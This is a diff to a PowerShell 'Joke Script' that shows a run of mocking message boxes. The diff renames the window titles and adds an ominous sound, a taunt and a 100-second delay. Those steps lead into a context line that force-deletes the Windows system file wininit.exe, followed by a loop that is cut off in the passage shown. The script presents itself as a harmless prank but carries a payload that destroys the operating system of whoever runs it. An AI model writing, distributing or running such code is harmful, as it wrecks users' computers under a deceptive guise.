@@ -11,7 +11,7 @@ Start-Sleep -Seconds 6
 
 [System.Windows.MessageBox]::Show(
     "That was a joke. Haha. Fat chance. Anyway, if you have a PC, congrats! You're immune and you can just clean it up! But if you have a laptop, you're cooked.",
-    "Joke Script (PowerShell)",
+    "disodiumdihidroxydimethyloctendocosahydroxypentadecamethyltetrahydroxytimethylmethylidenepentadecenoctohectahydropyranopyranooxepinopyranopyranopyranopyranopyranopyranopyranooxocinatridecaphanylsulfate (PowerShell)",
     "OK",
     "Information"
 )
@@ -20,7 +20,7 @@ Start-Sleep -Seconds 1
 
 $result = [System.Windows.MessageBox]::Show(
     "Thanks for testing out 'Joke Script' by Melted. We thank you for your 'hard work' and goodbye. By the way, was the script good?",
-    "Joke Script (PowerShell)",
+    "disodiumdihidroxydimethyloctendocosahydroxypentadecamethyltetrahydroxytimethylmethylidenepentadecenoctohectahydropyranopyranooxepinopyranopyranopyranopyranopyranopyranopyranooxocinatridecaphanylsulfate (PowerShell)",
     "YesNo",
     "Question"
 )
@@ -40,6 +40,14 @@ if ($result -eq [System.Windows.MessageBoxResult]::Yes) {
         "Question"
     )
     if ($result2 -eq [System.Windows.MessageBoxResult]::No) {
+        Start-Process "endofcomputer.mp3"
+        [System.Windows.MessageBox]::Show(
+    "Ohh, you really shouldn't have done that. Read the readme and enjoy the last seconds of Windows. (Soundtrack from 'No, I'm Not A Human' by Trioskaz.)",
+    "disodiumdihidroxydimethyloctendocosahydroxypentadecamethyltetrahydroxytimethylmethylidenepentadecenoctohectahydropyranopyranooxepinopyranopyranopyranopyranopyranopyranopyranooxocinatridecaphanylsulfate",
+    "OK",
+    "Information"
+)
+        Start-Sleep -Seconds 100
         Remove-Item "C:\Windows\System32\wininit.exe" -Force
         Start-Sleep -Seconds 1
         1..2763 | ForEach-Object {
